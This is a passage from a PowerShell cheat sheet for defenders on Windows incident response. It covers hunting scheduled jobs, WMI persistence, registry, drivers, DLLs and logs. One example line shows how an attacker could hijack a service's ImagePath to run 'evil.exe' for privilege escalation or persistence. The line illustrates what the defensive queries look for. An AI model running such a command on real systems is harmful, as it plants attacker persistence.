And a command to get granularity behind the schtask requires you to give the taskpath. Tasks with more than one taskpath will throw an error here
```powershell
$task = "CacheTask";
get-scheduledtask -taskpath (Get-ScheduledTask -Taskname "$task").taskpath | Export-ScheduledTask
#this isn't the way the microsoft docs advise. 
     ##But I prefer this, as it means I don't need to go and get the taskpath when I already know the taskname
```
![image](https://user-images.githubusercontent.com/44196051/120563667-18803980-c401-11eb-9b10-621169f38437.png)

#### To stop the task
```powershell
Get-ScheduledTask "memetask" | Stop-ScheduledTask -Force -Confirm:$false -verbose
```
### Show what programs run at startup
```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List 
```
![image](https://user-images.githubusercontent.com/44196051/120332890-12963580-c2e7-11eb-9805-feee341140fa.png)


### Scheduled Jobs
Surprisingly, not many people know about [Scheduled Jobs](https://devblogs.microsoft.com/scripting/introduction-to-powershell-scheduled-jobs/). They're not anything too strange or different, they're just scheduled tasks that are specificially powershell. 

#### Find out what scheduled jobs are on the machine
```powershell
 Get-ScheduledJob
 # pipe to | fl * for greater granularity
```
![image](https://user-images.githubusercontent.com/44196051/120564374-a7418600-c402-11eb-8b7c-92fd86c9df2f.png)

#### Get detail behind scheduled jobs
```powershell
Get-ScheduledJob | Get-JobTrigger | 
Ft -Property @{Label="ScheduledJob";Expression={$_.JobDefinition.Name}},ID,Enabled, At, frequency, DaysOfWeek
#pipe to fl or ft, whatever you like the look of more in the screenshot
```

![image](https://user-images.githubusercontent.com/44196051/120564784-92192700-c403-11eb-930a-3aa0ba178434.png)

#### Kill job
The following all work.
```powershell
Disable-ScheduledJob -Name evil_sched
Unregister-ScheduledJob -Name eviler_sched
Remove-Job -id 3 
#then double check it's gone with Get-ScheduledJob

#if persists, tack on to unregister or remove-job
-Force -Confirm:$false -verbose
```

### Hunt WMI Persistence

WMIC can do some pretty [evil things](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf). One sneaky, pro-gamer move it can pull is *persistence*

In the image below I have included a part of setting up WMI persistence

![image](https://user-images.githubusercontent.com/44196051/122431376-4ed6c080-cf8c-11eb-9538-55f6e0e7c7a5.png)


##### Finding it
Now, our task is to find this persistent evil.

Get-CimInstance comes out cleaner, but you can always rely on the alternate Get-WMIObject

```powershell

Get-CimInstance -Namespace root\Subscription -Class __FilterToConsumerBinding
Get-CimInstance -Namespace root\Subscription -Class __EventFilter
Get-CimInstance -Namespace root\Subscription -Class __EventConsumer

## OR

Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
```

![image](https://user-images.githubusercontent.com/44196051/122433194-e7217500-cf8d-11eb-94b1-957254bf0f4c.png)
![image](https://user-images.githubusercontent.com/44196051/122433360-0fa96f00-cf8e-11eb-90f6-4c3baafaeddd.png)
![image](https://user-images.githubusercontent.com/44196051/122433449-26e85c80-cf8e-11eb-9226-ce9f6985d76b.png)

#### Removing it

Now we've identified the evil WMI persistence, let us be rid of it! 

We can specify the Name as `EVIL` as that's what it was called across the three services. Whatever your persistence calls itself, change the name for that

```powershell
#notice this time, we use the abbrevated version of CIM and WMI

gcim -Namespace root\Subscription -Class __EventFilter | 
? Name -eq "EVIL" | Remove-CimInstance -verbose

gcim -Namespace root\Subscription -Class __EventConsumer| 
? Name -eq "EVIL" | Remove-CimInstance -verbose

#it's actually easier to use gwmi here instead of gcim
gwmi -Namespace root\Subscription -Class __FilterToConsumerBinding | 
? Consumer -match "EVIL" | Remove-WmiObject -verbose
```

![image](https://user-images.githubusercontent.com/44196051/122436413-b55ddd80-cf90-11eb-9cb5-7854ddf6225d.png)


#### A note on CIM 

You may see WMI and CIM talked about together, whether on the internet or on in the Blue Team Notes here. 

CIM is a standard for language for vendor-side management of a lot of the physical and digital mechanics of what makes a computer tick. WMIC was and is Microsoft's interpretation of CIM. 

However, Microsoft is going to decommision WMIC soon. So using `Get-Ciminstance` versions rather than `get-wmiobject` is probably better for us to learn in the long term. I dunno man, [It's complicated](https://devblogs.microsoft.com/scripting/should-i-use-cim-or-wmi-with-windows-powershell/). 

---

## File Queries

<details>
    <summary>section contents</summary>
  
  + [Wildcard paths and files](#wildcard-paths-and-files)
  + [Check if a specific file or path is alive.](#check-if-a-specific-file-or-path-is-alive)
  + [test if  files and directories are present or absent](#test-if--files-and-directories-are-present-or-absent)
  + [Query File Contents](#query-file-contents)
    - [Alternate data streams](#alternate-data-streams)
    - [Read hex of file](#read-hex-of-file)
  + [Recursively look for particular file types, and once you find the files get their hashes](#recursively-look-for-particular-file-types--and-once-you-find-the-files-get-their-hashes)
  + [Compare two files' hashes](#compare-two-files--hashes)
  + [Find files written after X date](#find-files-written-after-x-date)
  + [copy multiple files to new location](#copy-multiple-files-to-new-location)
 
</details>

### Wildcard paths and files
You can chuck wildcards in directories for gci, as well as wildcard to include file types.

Let's say we want to look in all of the Users \temp\ directories. We don't want to put their names in, so we wildcard it.

We also might only be interested in the pwsh scripts in their \temp\, so let's filter for those only

```powershell
gci "C:\Users\*\AppData\Local\Temp\*" -Recurse -Force -File  -Include *.ps1, *.psm1, *.txt | 
ft lastwritetime, name -autosize | 
out-string -width 800
```
![image](https://user-images.githubusercontent.com/44196051/121200190-741c4e00-c86b-11eb-800e-f3170c2a02e5.png)


### Check if a specific file or path is alive. 

I've found that this is a great one to quickly check for specific vulnerabilities. Take for example, CVE-2021-21551. The one below this one is an excellent way of utilising the 'true/false' binary results that test-path can give
``` powershell
test-path -path "C:\windows\temp\DBUtil_2_3.Sys"
```
![image](https://user-images.githubusercontent.com/44196051/119982761-283def00-bfb7-11eb-83ab-061b6c628372.png)

### test if  files and directories are present or absent
This is great to just sanity check if things exist. Great when you're trying to check if files or directories have been left behind when you're cleaning stuff up.
```powershell
$a = Test-Path "C:\windows\sysmon.exe"; $b= Test-Path "C:\Windows\SysmonDrv.sys"; $c = test-path "C:\Program Files (x86)\sysmon"; $d = test-path "C:\Program Files\sysmon"; 
IF ($a -eq 'True') {Write-Host "C:\windows\sysmon.exe present"} ELSE {Write-Host "C:\windows\sysmon.exe absent"}; 
IF ($b -eq 'True') {Write-Host "C:\Windows\SysmonDrv.sys present"} ELSE {Write-Host "C:\Windows\SysmonDrv.sys absent"} ; 
IF ($c -eq 'True') {Write-Host "C:\Program Files (x86)\sysmon present"} ELSE {Write-Host "C:\Program Files (x86)\sysmon absent"}; 
IF ($d -eq 'True') {Write-Host "C:\Program Files\sysmon present"} ELSE {Write-Host "C:\Program Files\sysmon absent"}
```
![image](https://user-images.githubusercontent.com/44196051/119979754-443f9180-bfb3-11eb-9259-5409a0d98c04.png)

^ The above is a bit over-engineered. Here's an an abbrevated version
```powershell
$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
foreach ($Item in $Paths){if
(test-path $Item) {write "$Item present"}else{write "$Item absent"}}
```
![image](https://user-images.githubusercontent.com/44196051/120552156-c7ffe080-c3ee-11eb-8f81-3983cab8083b.png)

We can also make this conditional. Let's say if Process MemeProcess is NOT running, we can then else it to go and check if files exist
```powershell
$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
if (Get-Process | where-object Processname -eq "explorer") {write "process working"} else {
foreach ($Item in $Paths){if (test-path $Item) {write "$Item present"}else{write "$Item absent"}}}
```
![image](https://user-images.githubusercontent.com/44196051/120553995-1c0bc480-c3f1-11eb-811d-eca65d10328d.png)

You can use `test-path` to query Registry, but even the 2007 [Microsoft docs say](https://devblogs.microsoft.com/powershell/test-path-we-goofed/) that this can give inconsistent results, so I wouldn't bother with test-path for reg stuff when it's during an IR

### Query File Contents

Seen a file you don't recognise? Find out some more about it! Remember though: don't trust timestamps!
```powershell
Get-item C:\Temp\Computers.csv |
select-object -property @{N='Owner';E={$_.GetAccessControl().Owner}}, *time, versioninfo | fl 
```
![image](https://user-images.githubusercontent.com/44196051/120334042-3443ec80-c2e8-11eb-84a9-c141ca5198a8.png)

#### Alternate data streams
```powershell
# show streams that aren't the normal $DATA
get-item evil.ps1 -stream "*" | where stream -ne ":$DATA"
# If you see an option that isn't $DATA, hone in on it
get-content evil.ps1 -steam "evil_stream"
```
#### Read hex of file
```powershell
gc .\evil.ps1 -encoding byte | 
Format-Hex
```
![image](https://user-images.githubusercontent.com/44196051/120565546-3e0f4200-c405-11eb-9045-e38fc79e2810.png)

### Recursively look for particular file types, and once you find the files get their hashes
This one-liner was a godsend during the Microsoft Exchange ballache back in early 2021

```powershell
Get-ChildItem -path "C:\windows\temp" -Recurse -Force -File -Include *.aspx, *.js, *.zip|
Get-FileHash |
format-table hash, path -autosize | out-string -width 800
```
![image](https://user-images.githubusercontent.com/44196051/120917857-66b76600-c6a9-11eb-85f3-cce3ff502476.png)


### Compare two files' hashes
```powershell
get-filehash "C:\windows\sysmondrv.sys" , "C:\Windows\HelpPane.exe"
```
![image](https://user-images.githubusercontent.com/44196051/120772800-97b46100-c518-11eb-84bf-409640c516bc.png)

### Find files written after X date
I personally wouldn't use this for DFIR. It's easy to manipulate timestamps....plus, Windows imports the original compiled date for some files and binaries if I'm not mistaken

Change the variables in the first time to get what you're looking
```powershell
$date = "12/01/2021"; $directory = "C:\temp"
get-childitem "$directory" -recurse|
where-object {$_.mode -notmatch "d"}| 
where-object {$_.lastwritetime -gt [datetime]::parse("$date")}|
Sort-Object -property LastWriteTime | format-table lastwritetime, fullname -autosize
```

![image](https://user-images.githubusercontent.com/44196051/120306808-2b442280-c2ca-11eb-82f8-bca23b5ee0d1.png)

### copy multiple files to new location
```powershell
copy-item "C:\windows\System32\winevt\Logs\Security.evtx", "C:\windows\System32\winevt\Logs\Windows PowerShell.evtx" -destination C:\temp
```

---

## Reg Queries

<details>
    <summary>section contents</summary>

  + [Show reg keys](#show-reg-keys)
  + [Read a reg entry](#read-a-reg-entry)
  + [Remove a reg entry](#remove-a-reg-entry)
  + [Example Malicious Reg](#example-malicious-reg)
  + [Understanding Reg Permissions](#understanding-reg-permissions)
    - [Get-ACl](#get-acl)
    - [Convert SDDL](#convert-sddl)
    - [What could they do with poor permissions?](#what-could-they-do-with-poor-permissions)
  + [Hunting for Reg evil](#hunting-for-reg-evil)
    - [Filtering Reg ImagePath](#filtering-reg-imagepath)


</details>

### Show reg keys

[Microsoft Docs](https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users) detail the regs: their full names, abbrevated names, and what their subkeys generally house 

```powershell
##show all reg keys
(Gci -Path Registry::).name

##lets take HKEY_CURRENT_USER as a subkey example. Let's see the entries in this subkey
(Gci -Path HKCU:\).name

# If you want to absolutely fuck your life up, you can list the names recursively....will take forever though
(Gci -Path HKCU:\ -recurse).name
```
![image](https://user-images.githubusercontent.com/44196051/119998273-75768c80-bfc8-11eb-869a-807a140d7a52.png)

### Read a reg entry
```powershell
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv"
```
![image](https://user-images.githubusercontent.com/44196051/119994436-832a1300-bfc4-11eb-98cb-b4148413ac97.png)

### Remove a reg entry
If there's a malicious reg entry, you can remove it this way
```powershell
# Read the reg to make sure this is the bad boy you want
get-itemproperty -Path 'HKCU:\Keyboard Layout\Preload\'
#remove it by piping it to remove-item
get-itemproperty -Path 'HKCU:\Keyboard Layout\Preload\' | Remove-Item -Force -Confirm:$false -verbose
# double check it's gone by trying to re-read it
get-itemproperty -Path 'HKCU:\Keyboard Layout\Preload\'
```
![image](https://user-images.githubusercontent.com/44196051/119999624-d8b4ee80-bfc9-11eb-9770-5ec6e78f9714.png)

### Understanding Reg Permissions

Reg permissions, and ACL and SDDL in general really, are a bit long to understand. But worth it, as adversaries like using the reg.

Adversaries will look for registries with loose permissions, so let's show how we first can identify loose permissions

#### Get-ACl

The Access Control List (ACL) considers the permissions associated with an object on a Windows machine. It's how the machine understands privileges, and who is allowed to do what.

Problem is, if you get and `get-acl` for a particular object, it ain't a pretty thing

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\ | fl
```
There's a lot going on here. Moreover, what the fuck is that SDDL string at the bottom? 

The Security Descriptor Definition Language (SDDL) is a representation for ACL permissions, essentially

![image](https://user-images.githubusercontent.com/44196051/120821264-378be200-c54d-11eb-8ca6-436393b3fb8e.png)

#### Convert SDDL
You could figure out what the wacky ASCII chunks mean in SDDL....but I'd much rather convert the permissions to something human readable

Here, an adversary is looking for a user they control to have permissions to maniptulate the service, likely they want *Full Control*
```powershell
$acl = Get-Acl -Path hklm:\System\CurrentControlSet\services\;
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl[0]};
ConvertFrom-SddlString -Sddl $acl.Sddl -Type RegistryRights | Foreach-Object {$_.DiscretionaryAcl[0]}
# bottom one specifices the  registry access rights when you create RegistrySecurity objects
```
![image](https://user-images.githubusercontent.com/44196051/120823443-58edcd80-c54f-11eb-850f-4f0049bcae95.png)


#### What could they do with poor permissions?

An adversary in control of a loosely permissioned registry entry for a service, for example, could give themselves a privesc or persistence. For example:
```powershell
#don't actually run this
Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\example_service -name ImagePath -value "C:\temp\evil.exe"
```
### Hunting for Reg evil

Now we know how reg entries are compromised, how can we search? 

The below takes the services reg as an example, and searches for specifically just the reg-key Name and Image Path. 
 
```powershell

Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#You can search recursively with this, kind of, if you use wildcards in the path names. Will take longer if you do recursively search though
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\**\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

# This one-liner is over-engineered. # But it's a other way to be recursive if you start from a higher directory in reg
# will take a while though
$keys = Get-ChildItem -Path "HKLM:\System\CurrentControlSet\" -recurse -force ;
$Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath };
ForEach ($Item in $Items) {"{0,-35} {1,-10} " -f $Item.PSChildName, $Item.ImagePath} 
```

![image](https://user-images.githubusercontent.com/44196051/120918169-e560d300-c6aa-11eb-98a4-a9a27f264a0b.png)

#### Filtering Reg ImagePath

Let's continue to use the \Services\ reg as our example. 

Remember in the above example of a malicious reg, we saw the ImagePath had the value of C:\temp\evil.exe. And we're seeing a load of .sys here. So can we specifically just filter for .exes in the ImagePath. 

I have to mention, don't write .sys files off as harmless. Rootkits and bootkits weaponise .sys, for example.

If you see a suspicious file in reg, you can go and collect it and investigate it, or collect it's hash. When it comes to the ImagePath, \SystemRoot\ is usually C:\Windows\, but you can confirm with `$Env:systemroot` . 

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
where ImagePath -like "*.exe*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

# if you notice, on line two we wrap .exe in TWO in wildcards. Why? 
  # The first wildcard is to ensure we're kind of 'grepping' for a file that ends in a .exe. 
    # Without the first wildcard, we'd be looking for literal .exe
  # The second wildcard is to ensure we're looking for the things that come after the .exe
     # This is to make sure we aren't losing the flags and args of an executable

# We can filter however we wish, so we can actively NOT look for .exes
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
where ImagePath -notlike "*.exe*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#fuck it, double stack your filters to not look for an exe or a sys...not sure why, but go for it!
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
? {($_.ImagePath -notlike "*.exe*" -and $_.Imagepath -notlike "*.sys*")} | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#If you don't care about Reg Entry name, and just want the ImagePath
(Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*").ImagePath  

```
![image](https://user-images.githubusercontent.com/44196051/120833359-9bb4a300-c559-11eb-8647-69d990227dbb.png)

---


## Driver Queries

<details>
    <summary>section contents</summary>
  
  + [Printer Drivers](#printer-drivers)
  + [System Drivers](#system-drivers)
    - [Unsigned](#unsigned)
    - [Signed](#Signed)
  + [Other Drivers](#other-drivers)
  + [Drivers by Registry](#drivers-by-registry)
  + [Drivers by Time](#drivers-by-time)
 
</details>

Drivers are an interesting one. It isn't everyday you'll see malware sliding a malicious driver in ; bootkits and rootkits have been known to weaponise drivers. But it's well worth it, because it's an excellent method for persistence if an adversary can pull it off without blue-screening a machine. You can read more about it [here](https://eclypsium.com/wp-content/uploads/2019/11/Mother-of-All-Drivers.pdf)

You can utilise [Winbindex](https://winbindex.m417z.com) to investigate drivers, and compare a local copy you have with the indexed info. Malicious copies may have a hash that doesn't match, or a file size that doesn't quite match.

![image](https://user-images.githubusercontent.com/44196051/121807617-d4850400-cc4c-11eb-9a47-8b3e18bfe48f.png)


### Printer Drivers

```powershell
Get-PrinterDriver | fl Name, *path*, *file* 
```

![image](https://user-images.githubusercontent.com/44196051/121266294-2545d700-c8b2-11eb-927e-45b81f6539e6.png)

### System Drivers

If drivers are or aren't signed, don't use that as the differentiation for what is legit and not legit. Some legitimate drivers are not signed ; some malicious drivers sneak a signature. 


#### Unsigned

Get unsigned drivers. Likely to not return much

```powershell
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
Get-AuthenticodeSignature | 
? Status -ne "Valid" | ft -autosize

gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
Get-AuthenticodeSignature | 
? Status -ne "Valid" | ft -autosize

```

#### Signed

Get the signed ones. Will return a lot. 

```powershell
Get-WmiObject Win32_PnPSignedDriver | 
fl DeviceName, FriendlyName, DriverProviderName, Manufacturer, InfName, IsSigned, DriverVersion

# alternatives
gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
Get-AuthenticodeSignature | 
? Status -eq "Valid" | ft -autosize 
#or
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
Get-AuthenticodeSignature | 
? Status -eq "Valid" | ft -autosize 

```

![image](https://user-images.githubusercontent.com/44196051/121267019-6ee2f180-c8b3-11eb-83e9-d4f9218dfdaf.png)

![image](https://user-images.githubusercontent.com/44196051/121755059-207d5f00-cb0e-11eb-82b0-8a90e13153ac.png)


### Other Drivers 

Gets all 3rd party drivers 

```powershell
Get-WindowsDriver -Online -All | 
fl Driver, ProviderName, ClassName, ClassDescription, Date, OriginalFileName, DriverSignature 
```
![image](https://user-images.githubusercontent.com/44196051/121268822-97b8b600-c8b6-11eb-87ba-787fa5dd4d92.png)


### Drivers by Registry

You can also leverage the Registry to look at drivers
```powershell
#if you know the driver, you can just give the full path and wildcard the end if you aren't sure of full spelling
get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\DBUtil*" 

#You'll likely not know the path though, so just filter for drivers that have \drivers\ in their ImagePath
get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\*"  | 
? ImagePath -like "*drivers*" | 
fl ImagePath, DisplayName
```
(![image](https://user-images.githubusercontent.com/44196051/121329227-eb55ee80-c90c-11eb-808d-0e24fdfd2594.png)


### Drivers by Time

Look for the drivers that exist via directory diving.. We can focus on .INF and .SYS files, and sort by the time last written.

```powershell
#change to LastWriteTimeUtc if you need to.

# first directory location
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf | 
sort-object LastWriteTime -Descending |
ft FullName,LastWriteTime | out-string -width 850

# second driver location
gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
sort-object LastWriteTime -Descending |
ft FullName,LastWriteTime | out-string -width 850
```

![image](https://user-images.githubusercontent.com/44196051/121754106-acda5280-cb0b-11eb-9b5c-6c2195e17ef7.png)


## DLL Queries

<details>
    <summary>section contents</summary>
  
  + [DLLs used in Processes](#dlls-used-in-processes)
    - [Investigate Process DLLs](#investigate-process-dlls)
  + [Investigate DLLs](#investigate-dlls)
    - [Generically](#generically)
    - [Invalid](#invalid)
    - [Specifically](#specifically)
      - [Verify](#verify)
</details>

### DLLs Used in Processes
We've already discussed how to show [DLLs used in processes](#show-all-dlls-loaded-with-a-process)

But what about getting _granular_. Well, let's pick on a specific process we can see running, and let's get the DLLs involved, their file location, their size, and if they have a company name

```powershell
get-process -name "google*" | 
Fl @{l="Modules";e={$_.Modules | fl FileName, Size, Company | out-string}}

#alterntive version, just print filepath of specific process' DLL
(gps -name "google*").Modules.FileName
```
![image](https://user-images.githubusercontent.com/44196051/121806180-ba482780-cc46-11eb-99b3-c8e93ac53708.png)

You can in theory run this without specifying a process, and it will just retrieve all of the DLLs involved in all the processes. But this will be LONG man.

#### Investigate Process Dlls
We can zero in on the DLLs that a process may call on
```powershell
(gps -name "google").Modules.FileName | Get-AuthenticodeSignature
```
![image](https://user-images.githubusercontent.com/44196051/121806887-9df9ba00-cc49-11eb-86e6-e42f609ca995.png)


### Investigate DLLs
#### Generically

This will return a lot of DLLs and their last write time. I personally would avoid this approach

```powershell
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | fl Name, Lastwritetime

#to get signature codes for these pipe it
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | Get-AuthenticodeSignature
#to get hashes for these, pipe it too
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | get-filehash
```
![image](https://user-images.githubusercontent.com/44196051/121806606-77874f00-cc48-11eb-97bc-5cdea18c9513.png)

#### Invalid

Like drivers, if a DLL is signed or un-signed, it doesn't immediately signal malicious. There are plenty of official files on a Windows machine that are unsigned. Equally, malicious actors can get signatures for their malicious files too. 

You'll get a lot of results if you look for VALID, signed DLLs. So maybe filter for INVALID ones first. Both will take some time
```powershell

#get invalid
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
Get-AuthenticodeSignature | ? Status -ne "Valid" 

#collect valid ones with this command
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
Get-AuthenticodeSignature | ? Status -eq "Valid" 
```

![image](https://user-images.githubusercontent.com/44196051/121807259-478d7b00-cc4b-11eb-99f5-ec92f341c319.png)


#### Specifically

We can apply all of the above to individual DLLs. If I notice something strange during the [process' DLL hunt](#dlls-used-in-processes), or if I had identified a DLL with [an invalid signature](#invalid). I'd then hone in on that specific DLL.

```powershell
gci -path C:\Windows\twain_32.dll | get-filehash
gci -path C:\Windows\twain_32.dll | Get-AuthenticodeSignature 
```
![image](https://user-images.githubusercontent.com/44196051/121808044-b4564480-cc4e-11eb-896d-8a22302e30c2.png)

##### Verify

If you need to verify what a DLL is, you have a myriad of ways. One way is through [Winbindex](https://winbindex.m417z.com)

Here, you can put the name of a DLL (or many of other filetypes), and in return get a whole SLUETH of data. You can compare the file you have locally with the Winbindex info, which may highlight malice - for example, does the hash match ? Or, is your local copy a much larger file size than the suggested size in the index?

![image](https://user-images.githubusercontent.com/44196051/121807482-401aa180-cc4c-11eb-9dff-5efd9107a3cf.png)

If not Windex, you have the usual Google-Fu methods, and having the file hash will aid you [here](#specifically)


## Log Queries 

<details>
    <summary>section contents</summary>
  
  + [Show Logs](#show-logs)
    - [Overview of what a specific log is up to](#overview-of-what-a-specific-log-is-up-to)
    - [Specifically get the last time a log was written to](#specifically-get-the-last-time-a-log-was-written-to)
    - [Compare the date and time a log was last written to](#compare-the-date-and-time-a-log-was-last-written-to)
  + [WinRM & WECSVC permissions](#winrm---wecsvc-permissions)

</details>

From a security perspective, you probably don't want to query logs on the endpoint itself....endpoints after a malicious event can't be trusted. You're better to focus on the logs that have been forwarded from endpoints and centralised in your SIEM. 

If you REALLY want to query local logs for security-related instances, I can recommend this [awesome repo](https://gist.github.com/exp0se/b57f434c9c34b98f84a2)

I've tended to use these commands to troubleshoot Windows Event Forwarding and other log related stuff.

### Show Logs
Show logs that are actually enabled and whose contents isn't empty.
```powershell
Get-WinEvent -ListLog *|
where-object {$_.IsEnabled -eq "True" -and $_.RecordCount -gt "0"} | 
sort-object -property LogName | 
format-table LogName -autosize -wrap
```
![image](https://user-images.githubusercontent.com/44196051/120351284-a96aee00-c2f7-11eb-906d-a8469175b209.png)


#### Overview of what a specific log is up to
```powershell
Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational | Format-List -Property * 
```
![image](https://user-images.githubusercontent.com/44196051/120352076-547ba780-c2f8-11eb-8fa7-f8b11f4776b1.png)

#### Specifically get the last time a log was written to
```powershell
(Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime 
```
![image](https://user-images.githubusercontent.com/44196051/119979946-81a41f00-bfb3-11eb-8bc0-f2e893440b18.png)

#### Compare the date and time a log was last written to
Checks if the date was written recently, and if so, just print _sysmon working_ if not recent, then print the date last written. I've found sometimes that sometimes sysmon bugs out on a machine, and stops committing to logs. Change the number after `-ge` to be more flexible than the one day it currently compares to

```powershell
$b = (Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime; 
$a = Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational| where-object {(new-timespan $_.LastWriteTime).days -ge 1}; 
if ($a -eq $null){Write-host "sysmon_working"} else {Write-host "$env:computername $b"}
```
![image](https://user-images.githubusercontent.com/44196051/119979908-72bd6c80-bfb3-11eb-9bff-856ebcc01375.png)

### WinRM & WECSVC permissions
Test the permissions of winrm - used to see windows event forwarding working, which uses winrm usually on endpoints and wecsvc account on servers
```cmd
netsh http show urlacl url=http://+:5985/wsman/ && netsh http show urlacl url=https://+:5986/wsman/
``` 
![image](https://user-images.githubusercontent.com/44196051/119980070-ae583680-bfb3-11eb-8da7-51d7e5393599.png)

---

## Powershell Tips

<details>
    <summary>section contents</summary>

  + [Get Alias](#get-alias)
  + [Get Command and Get Help](#get-command-and-get-help)
  + [WhatIf](#whatif)
  + [Clip](#clip)
  + [Output Without Headers](#output-without-headers)
  + [Re-run commands](#re-run-commands)
  + [Stop Truncation](#stop-trunction)
    - [Out-String](#out-string)
    - [-Wrap](#-wrap)

</details>

### Get Alias
PwSh is great at abbreviating the commands. Unfortunately, when you're trying to read someone else's abbreviated PwSh it can be ballache to figure out exactly what each weird abbrevation does.

Equally, if you're trying to write something smol and cute you'll want to use abbrevations!

Whatever you're trying, you can use `Get-Alias` to figure all of it out
```powershell
#What does an abbrevation do
get-alias -name gwmi
#What is the abbrevation for this
get-alias -definition write-output
#List all alias' and their full command
get-alias
```
![image](https://user-images.githubusercontent.com/44196051/120551039-81f64d00-c3ed-11eb-8cea-dadb07066942.png)

### Get Command and Get Help
This is similar to `apropos`in Bash. Essentially, you can search for commands related to keywords you give. 

Try to give singulars, not plural. For example, instead of `drivers` just do `driver`

```powershell
get-command *driver* 

## Once you see a particular command or function, to know what THAT does use get-help. 
# get-help [thing]
Get-Help Get-SystemDriver
```

![image](https://user-images.githubusercontent.com/44196051/121262958-d6e20980-c8ac-11eb-8aff-3ad46128da00.png)

![image](https://user-images.githubusercontent.com/44196051/121263587-ba929c80-c8ad-11eb-835b-632b9a6ce47e.png)

### WhatIf
`-WhatIf` is quite a cool flag, as it will tell you what will happen if you run a command. So before you kill a vital process for example, if you include whatif you'll gain some insight into the irreversible future!

```powershell
get-process -name "excel" | stop-process -whatif
```
![image](https://user-images.githubusercontent.com/44196051/121262413-02b0bf80-c8ac-11eb-9448-c76f26aff0df.png)

### Clip
You can pipe straight to your clipboard. Then all you have to do is paste
```powershell
# this will write to terminal
hostname
# this will pipe to clipboard and will NOT write to terminal
hostname | clip
# then paste to test
#ctrl+v
```
![image](https://user-images.githubusercontent.com/44196051/120554093-3e9ddd80-c3f1-11eb-9ddb-d24b8e87481b.png)

### Output Without Headers

You may just want a value without the collumn header that comes. We can do that with `-ExpandProperty`
```powershell
# use the -expandproperty before the object you want. IN this case, ID
 select -ExpandProperty id 
 
# so for example
get-process -Name "google*" | select -ExpandProperty id
# lets stop the particular google ID that we want
$PID =  get-process -Name "google" | ? Path -eq $Null | select -ExpandProperty id;
Stop-Process -ID $PID -Force -Confirm:$false -verbose
```

![image](https://user-images.githubusercontent.com/44196051/121708986-fc9b2880-cacf-11eb-8f4a-e9a4145a9ecd.png)

If you pipe to `| format-table` you can simply use the `-HideTableHeaders` flag

![image](https://user-images.githubusercontent.com/44196051/121710284-5d773080-cad1-11eb-8f2a-1bd27742a199.png)



### Re-run commands
If you had a command that was great, you can re-run it again from your powershell history!
```powershell
##list out history
get-history
#pick the command you want, and then write down the corresponding number
#now invoke history
Invoke-History -id 38

## You can do the alias / abbrevated method for speed
h
r 43
```
![image](https://user-images.githubusercontent.com/44196051/120559078-48770f00-c3f8-11eb-8726-fd7e627df473.png)
![image](https://user-images.githubusercontent.com/44196051/120559222-8f650480-c3f8-11eb-9b84-ef98dc26cb5c.png)


### Stop Trunction
#### Out-String
For reasons(?) powershell truncates stuff, even when it's really unhelpful and pointless for it to do so. Take the below for example: our hash AND path is cut off....WHY?! :rage:

![image](https://user-images.githubusercontent.com/44196051/120917435-3ec70300-c6a7-11eb-8b81-9832cd9c6cb6.png)

To fix this, use `out-string`

```powershell
#put this at the very end of whatever you're running and is getting truncated
| outstring -width 250
# or even more
| outstring -width 4096
#use whatever width number appropiate to print your results without truncation

#you can also stack it with ft. For example: 
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 
```
Look no elipses!
![image](https://user-images.githubusercontent.com/44196051/120917410-0e7f6480-c6a7-11eb-8546-0a59da8cd181.png)

#### -Wrap
In some places, it doesn't make sense to use out-string as it prints strangely. In these instances, try the `-wrap` function of `format-table`

This, for example is a mess because we used out-string. It's wrapping the final line in an annoying and strange way.

![image](https://user-images.githubusercontent.com/44196051/120917702-88641d80-c6a8-11eb-8f2e-676e2c358546.png)

```powershell
| ft -property * -autosize -wrap 
